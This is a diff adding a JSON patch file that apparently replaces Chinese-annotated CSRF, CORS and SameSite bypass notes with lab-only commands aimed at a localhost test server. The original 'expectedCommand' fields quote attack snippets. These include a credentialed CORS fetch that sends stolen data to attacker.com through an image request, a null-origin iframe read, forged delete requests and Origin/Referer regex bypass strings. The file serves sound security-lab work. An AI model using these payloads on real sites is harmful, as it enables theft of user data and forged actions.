@@ -1,0 +1,122 @@
+{
+  "schemaVersion": 1,
+  "entries": [
+    {
+      "id": "csrf-bypass",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# Token可预测\n分析Token生成规律，预测有效Token\n\n# Token未绑定会话\n使用其他用户的Token\n\n# Token重用\n同一个Token可多次使用\n\n# Token在GET参数中泄露\n从页面源码获取Token",
+          "command": "node -e \"const fs=require('fs');const rows=JSON.parse(fs.readFileSync('fixtures/csrf-control-matrix.json','utf8'));console.table(rows.map(x=>({route:x.route,token_required:x.token_required,session_bound:x.session_bound,methods:x.methods.join(',')})))\""
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 正则匹配不严谨\nReferer: http://attacker.com/target.com/\nReferer: http://target.com.attacker.com/\n\n# 空Referer\n<meta name=\"referrer\" content=\"no-referrer\">\n\n# HTTPS->HTTP降级\n从HTTPS站点跳转到HTTP不发送Referer",
+          "command": "for value in \"https://allowed.invalid/\" \"https://allowed.invalid.attacker.invalid/\" \"\"; do curl --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/lab/csrf/source-policy\" ${value:+-H \"Referer: $value\"} --data \"marker=CSRF_REFERER_MATRIX_B2\" | jq -c '{referer,allowed,reason}'; done"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# Origin为null\n使用data URL或about:blank\n\n# 正则绕过\nOrigin: http://target.com.attacker.com\nOrigin: http://attacktarget.com\n\n# IE11不发送Origin\nIE11在某些情况下不发送Origin头",
+          "command": "for value in \"https://allowed.invalid\" \"https://allowed.invalid.attacker.invalid\" \"null\"; do curl --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/lab/csrf/source-policy\" -H \"Origin: $value\" --data \"marker=CSRF_ORIGIN_MATRIX_C3\" | jq -c '{origin,allowed,reason}'; done"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# SameSite=Lax\nGET请求会发送Cookie\n构造GET形式的敏感操作\n\n# SameSite未设置\n默认行为可能允许跨站发送\n\n# 两分钟窗口\nSameSite=Lax有2分钟窗口期",
+          "command": "npx playwright test tests/csrf-defense-matrix.spec.mjs --project=chromium --reporter=line"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# Access-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true\n\n# Access-Control-Allow-Origin: *\n允许任意源\n\n# 反射Origin\nAccess-Control-Allow-Origin: [任意Origin]",
+          "command": "for value in \"https://allowed.invalid\" \"https://allowed.invalid.attacker.invalid\" \"null\"; do curl --silent --show-error --max-time 5 \"http://127.0.0.1:18080/lab/cors/policy\" -H \"Origin: $value\" -D - -o /dev/null | grep -Ei \"^(HTTP/|Access-Control-Allow-Origin:|Access-Control-Allow-Credentials:|Vary:)\"; done"
+        }
+      ]
+    },
+    {
+      "id": "csrf-cors",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 发送测试请求\ncurl -H \"Origin: http://attacker.com\" http://target.com/api\n\n# 检查响应头\nAccess-Control-Allow-Origin: http://attacker.com\nAccess-Control-Allow-Credentials: true\n\n# 危险配置\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true",
+          "command": "for value in \"https://allowed.invalid\" \"https://cross-origin.invalid\" \"null\"; do curl --silent --show-error --max-time 5 \"http://127.0.0.1:18080/lab/cors/policy\" -H \"Origin: $value\" -D - -o /dev/null | grep -Ei \"^(HTTP/|Access-Control-Allow-Origin:|Access-Control-Allow-Credentials:|Vary:)\"; done"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 服务器反射任意Origin\nAccess-Control-Allow-Origin: [请求的Origin]\nAccess-Control-Allow-Credentials: true\n\n# 攻击代码\nfetch(\"http://target.com/api/sensitive\", {\n  credentials: \"include\"\n})\n.then(r => r.json())\n.then(data => sendToAttacker(data));",
+          "command": "<!doctype html>\n<meta charset=\"utf-8\">\n<pre id=\"result\">pending</pre>\n<script>\nfetch(\"http://127.0.0.1:18080/lab/cors/credentialed-read?marker=CORS_REFLECT_A1\", {credentials: \"include\"})\n  .then(response => response.json())\n  .then(data => document.querySelector(\"#result\").textContent = JSON.stringify({marker: data.marker, visible: true}))\n  .catch(error => document.querySelector(\"#result\").textContent = error.name);\n</script>"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 允许null源\nAccess-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true\n\n# 使用data URL\n<iframe src=\"data:text/html,<script>\nfetch('http://target.com/api', {credentials: 'include'})\n.then(r => r.json()).then(sendToAttacker);\n</script>\"></iframe>",
+          "command": "<iframe sandbox=\"allow-scripts\" srcdoc=\"<pre id=result>pending</pre><script>fetch('http://127.0.0.1:18080/lab/cors/null-origin?marker=CORS_NULL_B2',{credentials:'include'}).then(r=>r.json()).then(d=>result.textContent=JSON.stringify({marker:d.marker,visible:true})).catch(e=>result.textContent=e.name)</script>\"></iframe>"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# 正则匹配不严谨\n允许: target.com\n绕过: attacktarget.com\ntarget.com.attacker.com\n\n# 攻击代码\nfetch(\"http://target.com.api.attacker.com/api\", {\n  credentials: \"include\"\n});",
+          "command": "for value in \"https://allowed.invalid.attacker.invalid\" \"https://attackallowed.invalid\" \"https://allowed-invalid.example\"; do curl --silent --show-error --max-time 5 \"http://127.0.0.1:18080/lab/cors/policy\" -H \"Origin: $value\" | jq -c '{origin,allowed,reason}'; done"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 利用CORS窃取数据\nfetch(\"http://target.com/api/user\", {\n  credentials: \"include\"\n})\n.then(r => r.json())\n.then(data => {\n  new Image().src = \"http://attacker.com/log?data=\" + encodeURIComponent(JSON.stringify(data));\n});",
+          "command": "<script>\nfetch(\"http://127.0.0.1:18080/lab/cors/credentialed-read?marker=CORS_READ_C3\", {credentials: \"include\"})\n  .then(response => response.text())\n  .then(body => document.body.dataset.visibleLength = String(body.length))\n  .catch(error => document.body.dataset.error = error.name);\n</script>"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "# 利用CORS执行操作\nfetch(\"http://target.com/api/delete\", {\n  method: \"POST\",\n  credentials: \"include\",\n  headers: {\"Content-Type\": \"application/json\"},\n  body: JSON.stringify({id: 123})\n});",
+          "command": "<script>\nfetch(\"http://127.0.0.1:18080/lab/cors/state-marker\", {\n  method: \"POST\",\n  credentials: \"include\",\n  headers: {\"Content-Type\": \"application/json\"},\n  body: JSON.stringify({marker: \"CORS_POST_D4\"})\n}).then(response => document.body.dataset.status = String(response.status));\n</script>"
+        }
+      ]
+    },
+    {
+      "id": "csrf-samesite",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# GET请求绕过\n构造GET形式的敏感操作\n<img src=\"http://target.com/delete?id=123\">\n\n# 顶级导航\n<a href=\"http://target.com/action\">点击</a>\nwindow.location = \"http://target.com/action\"\n\n# 两分钟窗口\n在用户交互后2分钟内发起请求",
+          "command": "<!doctype html>\n<a id=\"top\" href=\"http://127.0.0.1:18080/lab/csrf/samesite/navigation?marker=SAMESITE_NAV_A1\">Top-level navigation</a>\n<img src=\"http://127.0.0.1:18080/lab/csrf/samesite/subresource?marker=SAMESITE_IMG_A1\" alt=\"subresource control\">"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 子域名攻击\n从子域名发起请求\nhttp://sub.target.com/attack\n\n# Cookie覆盖\n设置同名Cookie覆盖\nSet-Cookie: session=attacker; Domain=.target.com\n\n# 利用重定向\n从目标站点重定向到攻击页面",
+          "command": "curl --silent --show-error --max-time 5 -D - -o /dev/null \"http://127.0.0.1:18080/lab/csrf/samesite/set-cookie\" | grep -Ei \"^(HTTP/|Set-Cookie:)\""
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 旧浏览器默认行为\nChrome < 80 默认None\nSafari 默认None\n\n# 可直接发起CSRF攻击\n无需特殊绕过",
+          "command": "npx playwright test tests/csrf-samesite-matrix.spec.mjs --project=chromium --reporter=line"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# OAuth回调绕过SameSite\n1. 发起OAuth登录\n2. 在回调中注入恶意请求\n3. Cookie在OAuth流程中发送",
+          "command": "<!doctype html>\n<script>window.open(\"http://127.0.0.1:18080/lab/csrf/samesite/callback?marker=SAMESITE_CALLBACK_B2\", \"_blank\", \"noopener\");</script>"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# HTTPS->HTTP降级\n从HTTPS站点发起HTTP请求\n某些情况下不发送SameSite",
+          "command": "<!doctype html>\n<a href=\"http://127.0.0.1:18080/lab/csrf/samesite/site?marker=SAMESITE_IP_C3\">IP host</a>\n<a href=\"http://localhost:18080/lab/csrf/samesite/site?marker=SAMESITE_HOST_C3\">localhost host</a>"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "# JavaScript重定向\nlocation.href = \"http://target.com/action\"\n可能绕过某些SameSite检查",
+          "command": "<script>location.href = \"http://127.0.0.1:18080/lab/csrf/samesite/client-redirect?marker=SAMESITE_REDIRECT_D4\";</script>"
+        }
+      ]
+    }
+  ]
+}
